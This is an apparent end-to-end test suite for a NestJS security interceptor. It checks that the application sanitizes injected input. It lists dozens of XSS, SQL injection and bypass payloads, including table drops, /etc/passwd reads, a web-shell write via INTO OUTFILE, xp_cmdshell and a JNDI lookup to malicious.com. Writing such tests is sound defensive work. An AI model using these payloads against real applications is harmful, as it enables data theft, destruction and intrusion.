import { Test, TestingModule } from '@nestjs/testing';
import { INestApplication } from '@nestjs/common';
import * as request from 'supertest';
import { AppModule } from '../src/app.module';
import { SecurityInterceptor } from '../src/common/interceptors/security.interceptor';

describe('Enhanced SecurityInterceptor (e2e)', () => {
  let app: INestApplication;

  beforeAll(async () => {
    const moduleFixture: TestingModule = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleFixture.createNestApplication();
    app.useGlobalInterceptors(new SecurityInterceptor());
    await app.init();
  });

  afterAll(async () => {
    await app.close();
  });

  describe('XSS Protection Tests', () => {
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<iframe src="javascript:alert(1)"></iframe>',
      '<img src="x" onerror="alert(1)">',
      '<svg onload="alert(1)">',
      '<object data="javascript:alert(1)">',
      '<embed src="javascript:alert(1)">',
      '<applet code="malicious.class">',
      '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
      '<link rel="stylesheet" href="javascript:alert(1)">',
      '<style>@import "javascript:alert(1)";</style>',
      'javascript:alert(1)',
      'vbscript:alert(1)',
      'data:text/html,<script>alert(1)</script>',
      'data:application/x-javascript,alert(1)',
      '&#60;script&#62;alert(1)&#60;/script&#62;',
      '&lt;script&gt;alert(1)&lt;/script&gt;',
      '<SCRIPT>alert(1)</SCRIPT>',
      '<ScRiPt>alert(1)</ScRiPt>',
      '<<SCRIPT>alert("XSS");//<</SCRIPT>',
      '<IMG """><SCRIPT>alert("XSS")</SCRIPT>">',
      '<INPUT TYPE="IMAGE" SRC="javascript:alert(\'XSS\');">',
      '<BODY ONLOAD=alert(\'XSS\')>',
      '<DIV STYLE="width: expression(alert(\'XSS\'));">',
      '${alert(1)}',
      '{{alert(1)}}',
      '<%=alert(1)%>',
      '<?php echo "alert(1)"; ?>',
      '#{alert(1)}',
      '${jndi:ldap://malicious.com/exploit}'
    ];

    test.each(xssPayloads)('should sanitize XSS payload: %s', async (payload) => {
      const response = await request(app.getHttpServer())
        .post('/auth/register')
        .send({
          email: `test${Date.now()}@example.com`,
          password: 'password123',
          firstName: payload,
          lastName: 'TestUser'
        })
        .expect((res) => {
          // The payload should be sanitized, response should not contain dangerous scripts
          const responseBody = JSON.stringify(res.body);
          expect(responseBody).not.toMatch(/<script/i);
          expect(responseBody).not.toMatch(/javascript:/i);
          expect(responseBody).not.toMatch(/vbscript:/i);
          expect(responseBody).not.toMatch(/onload=/i);
          expect(responseBody).not.toMatch(/onerror=/i);
          expect(responseBody).not.toMatch(/alert\(/i);
        });
    });

    it('should sanitize XSS in query parameters', async () => {
      const maliciousQuery = '<script>alert("XSS")</script>';
      await request(app.getHttpServer())
        .get(`/genres?search=${encodeURIComponent(maliciousQuery)}`)
        .expect((res) => {
          // Should handle gracefully
          expect(res.status).toBeLessThan(500);
          const responseBody = JSON.stringify(res.body);
          expect(responseBody).not.toMatch(/<script/i);
        });
    });

    it('should sanitize XSS in headers', async () => {
      await request(app.getHttpServer())
        .get('/genres')
        .set('User-Agent', '<script>alert("XSS")</script>')
        .expect((res) => {
          // Should not crash and should handle malicious headers gracefully
          expect(res.status).toBeLessThan(500);
        });
    });
  });

  describe('SQL Injection Protection Tests', () => {
    const sqlInjectionPayloads = [
      "' OR '1'='1",
      "'; DROP TABLE users; --",
      "' UNION SELECT * FROM users --",
      "admin'--",
      "admin'/*",
      "' OR 1=1#",
      '" OR "1"="1',
      "' OR '1'='1' --",
      "' OR '1'='1' /*",
      "') OR ('1'='1",
      "1' AND (SELECT COUNT(*) FROM users) > 0 --",
      "1'; INSERT INTO users VALUES('hacker','password'); --",
      "1' WAITFOR DELAY '00:00:05' --",
      "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
      "1' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT version()))) --",
      "1' AND UPDATEXML(1,CONCAT(0x5c,(SELECT version())),1) --",
      "1' UNION SELECT LOAD_FILE('/etc/passwd') --",
      "1' INTO OUTFILE '/var/www/shell.php' --",
      "SELECT * FROM users WHERE id = 1; DROP TABLE users; --",
      "EXEC sp_configure 'show advanced options', 1",
      "EXEC xp_cmdshell 'dir'",
      "'; DECLARE @q VARCHAR(8000) SELECT @q = 0x...; EXEC(@q); --",
      "1' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)) > 64 --",
      "1' OR BENCHMARK(10000000,MD5(1)) --",
      "1' OR SLEEP(5) --",
      "1' OR pg_sleep(5) --",
      "1' OR dbms_pipe.receive_message(('a'),10) IS NULL --",
      "1' AND (SELECT * FROM mysql.user) --",
      "1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
      "1' AND (SELECT COUNT(*) FROM sysobjects) > 0 --",
      "1' AND (SELECT COUNT(*) FROM syscolumns) > 0 --",
      "1' AND (SELECT COUNT(*) FROM msysaccessobjects) > 0 --"
    ];

    test.each(sqlInjectionPayloads)('should sanitize SQL injection payload: %s', async (payload) => {
      const response = await request(app.getHttpServer())
        .post('/auth/login')
        .send({
          email: payload,
          password: 'password123'
        })
        .expect((res) => {
          // The payload should be sanitized - we expect either successful sanitization or proper error handling
          const responseBody = JSON.stringify(res.body);
          expect(responseBody).not.toMatch(/DROP\s+TABLE/i);
          expect(responseBody).not.toMatch(/UNION\s+SELECT/i);
          expect(responseBody).not.toMatch(/INSERT\s+INTO/i);
          expect(responseBody).not.toMatch(/DELETE\s+FROM/i);
          expect(responseBody).not.toMatch(/UPDATE\s+SET/i);
          expect(responseBody).not.toMatch(/EXEC\s+/i);
          expect(responseBody).not.toMatch(/xp_cmdshell/i);
          expect(responseBody).not.toMatch(/sp_configure/i);
          expect(responseBody).not.toMatch(/information_schema/i);
          expect(responseBody).not.toMatch(/WAITFOR\s+DELAY/i);
          expect(responseBody).not.toMatch(/BENCHMARK\s*\(/i);
          expect(responseBody).not.toMatch(/SLEEP\s*\(/i);
        });
    });

    it('should sanitize SQL injection in query parameters', async () => {
      const sqlPayload = "'; DROP TABLE movies; --";
      await request(app.getHttpServer())
        .get(`/genres?search=${encodeURIComponent(sqlPayload)}`)
        .expect((res) => {
          // Should handle gracefully
          expect(res.status).toBeLessThan(500);
          const responseBody = JSON.stringify(res.body);
          expect(responseBody).not.toMatch(/DROP\s+TABLE/i);
        });
    });
  });

  describe('Response Sanitization Tests', () => {
    it('should remove sensitive fields from responses', async () => {
      // Assuming user registration returns user data
      const response = await request(app.getHttpServer())
        .post('/auth/register')
        .send({
          email: `testuser${Date.now()}@example.com`,
          password: 'password123',
          firstName: 'Test',
          lastName: 'User'
        });

      // Check that sensitive fields are not present
      const sensitiveFields = [
        'password',
        'passwordHash',
        'salt',
        'resetToken',
        'verificationToken',
        'refreshToken',
        'accessToken',
        'apiKey',
        'secretKey',
        'privateKey',
        'sessionId',
        'csrfToken',
        'internalId',
        'hashSalt',
        'encryptionKey',
        'jwtSecret'
      ];

      const responseStr = JSON.stringify(response.body);
      sensitiveFields.forEach(field => {
        expect(responseStr).not.toMatch(new RegExp(`"${field}"`, 'i'));
      });
    });

    it('should sanitize dangerous content in response strings', async () => {
      // This would test if the response sanitization works for legitimate content
      // that might contain potentially dangerous patterns
      await request(app.getHttpServer())
        .get('/genres')
        .expect((res) => {
          // Should handle gracefully
          expect(res.status).toBeLessThan(500);
          const responseBody = JSON.stringify(res.body);
          // Should not contain dangerous script tags
          expect(responseBody).not.toMatch(/<script[^>]*>/i);
          expect(responseBody).not.toMatch(/<iframe[^>]*>/i);
        });
    });
  });

  describe('Edge Cases and Performance Tests', () => {
    it('should handle null and undefined values gracefully', async () => {
      await request(app.getHttpServer())
        .post('/auth/login')
        .send({
          email: null,
          password: undefined
        })
        .expect((res) => {
          expect(res.status).toBeLessThan(500);
        });
    });

    it('should handle deeply nested objects', async () => {
      const deepObject = {
        email: `deep${Date.now()}@example.com`,
        password: 'password123',
        firstName: 'Deep',
        lastName: 'Test',
        level1: {
          level2: {
            level3: {
              level4: {
                malicious: '<script>alert("deep")</script>'
              }
            }
          }
        }
      };

      await request(app.getHttpServer())
        .post('/auth/register')
        .send(deepObject)
        .expect((res) => {
          const responseBody = JSON.stringify(res.body);
          expect(responseBody).not.toMatch(/<script/i);
        });
    });

    it('should handle arrays with mixed content', async () => {
      const arrayWithMalicious = {
        name: 'Test Genre',
        description: 'A test genre',
        tags: [
          'legitimate tag',
          '<script>alert("array XSS")</script>',
          "'; DROP TABLE tags; --",
          { nested: '<iframe src="javascript:alert(1)"></iframe>' }
        ]
      };

      await request(app.getHttpServer())
        .post('/genres')
        .send(arrayWithMalicious)
        .expect((res) => {
          // Should handle gracefully - either success or proper error handling
          expect(res.status).toBeLessThan(500);
          const responseBody = JSON.stringify(res.body);
          expect(responseBody).not.toMatch(/<script/i);
          expect(responseBody).not.toMatch(/<iframe/i);
          expect(responseBody).not.toMatch(/DROP\s+TABLE/i);
        });
    });

    it('should handle large payloads without significant performance impact', async () => {
      const largePayload = {
        name: 'Large Genre',
        description: 'A'.repeat(10000) + '<script>alert("large")</script>' + 'B'.repeat(10000)
      };

      const startTime = Date.now();
      await request(app.getHttpServer())
        .post('/genres')
        .send(largePayload)
        .expect((res) => {
          const endTime = Date.now();
          const processingTime = endTime - startTime;
          
          // Should complete within reasonable time (adjust as needed)
          expect(processingTime).toBeLessThan(5000);
          
          // Should handle gracefully - either success or proper error handling
          expect(res.status).toBeLessThan(500);
          
          const responseBody = JSON.stringify(res.body);
          expect(responseBody).not.toMatch(/<script/i);
        });
    });

    it('should handle HTML entities correctly', async () => {
      const entityPayload = {
        name: 'Entity Genre',
        description: '&lt;script&gt;alert(1)&lt;/script&gt;'
      };

      await request(app.getHttpServer())
        .post('/genres')
        .send(entityPayload)
        .expect((res) => {
          // Should handle gracefully - either success or proper error handling
          expect(res.status).toBeLessThan(500);
          const responseBody = JSON.stringify(res.body);
          expect(responseBody).not.toMatch(/alert\(/i);
        });
    });
  });

  describe('Logging and Monitoring Tests', () => {
    it('should log security threats appropriately', async () => {
      // Note: This would require mocking the logger to capture log messages
      // For now, we just ensure the malicious request is handled
      await request(app.getHttpServer())
        .post('/auth/login')
        .send({
          email: '<script>alert("XSS")</script>',
          password: "'; DROP TABLE users; --"
        })
        .expect((res) => {
          // Should handle gracefully and not crash
          expect(res.status).toBeLessThan(500);
        });
    });
  });

  describe('Bypass Attempt Tests', () => {
    const bypassAttempts = [
      // Case variations
      '<ScRiPt>alert(1)</ScRiPt>',
      '<SCRIPT>alert(1)</SCRIPT>',
      
      // Encoding variations
      '%3Cscript%3Ealert(1)%3C/script%3E',
      '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
      
      // Null byte injection
      '<script>\0alert(1)</script>',
      
      // Unicode variations
      '<\u0073cript>alert(1)</script>',
      
      // Comments and space variations
      '<script/**/src="data:text/javascript,alert(1)">',
      '< script >alert(1)< /script >',
      
      // Protocol variations
      'JAVASCRIPT:alert(1)',
      'java\tscript:alert(1)',
      'java\nscript:alert(1)',
      
      // SQL injection bypasses
      "admin' OR '1'='1' --",
      "admin'/**/OR/**/1=1--",
      "admin' OR 'x'='x",
      "admin' UNION/**/SELECT/**/1,2,3--"
    ];

    test.each(bypassAttempts)('should prevent bypass attempt: %s', async (payload) => {
      await request(app.getHttpServer())
        .post('/auth/login')
        .send({
          email: payload,
          password: 'test'
        })
        .expect((res) => {
          const responseBody = JSON.stringify(res.body);
          expect(responseBody).not.toMatch(/<script/i);
          expect(responseBody).not.toMatch(/javascript:/i);
          expect(responseBody).not.toMatch(/alert\(/i);
          expect(responseBody).not.toMatch(/UNION/i);
          expect(responseBody).not.toMatch(/SELECT/i);
        });
    });
  });
});
